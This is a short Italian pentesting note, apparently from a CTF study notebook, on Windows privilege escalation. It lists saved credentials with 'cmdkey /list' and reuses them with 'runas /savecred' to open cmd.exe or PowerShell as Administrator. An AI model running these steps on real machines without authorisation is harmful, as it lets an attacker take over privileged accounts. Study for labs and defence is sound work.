---
---
#Privesc_Windows 

---
#### INDICE
- [[#Introduzione]]
- [[#Enumerazione con `cmdkey`]]
- [[#Abuso di `runas`]]
- [[#Esecuzione comandi come altro utente]]

---
---
---
### Introduzione
In Windows, le *credenziali salvate nel sistema* (Credential Manager) possono essere riutilizzate per autenticarsi o lanciare processi come utenti piÃ¹ privilegiati.  

---
### Enumerazione con `cmdkey`
Lista completa:

```
cmdkey /list
```

Esempio output:

```
Target: Domain:computername
Type: Domain Password
User:  COMPUTERNAME\Administrator
Target interessanti: TERMSRV/<host> (RDP), Domain:<host> o LegacyGeneric:runas/user:<UTENTE>.
```

---
### Abuso di `runas`
Se esistono credenziali salvate, puoi avviare un processo come quellâ€™utente senza password:

```
runas /savecred /user:DOMINIO\Administrator "cmd.exe"
```

ðŸ“šâ€‹ Writeups:
- [[Windows#Access| Access]],

---
### Esecuzione comandi come altro utente

```
runas /savecred /user:DOMINIO\Administrator "whoami /all"
runas /savecred /user:DOMINIO\Administrator "powershell.exe -NoProfile"
```


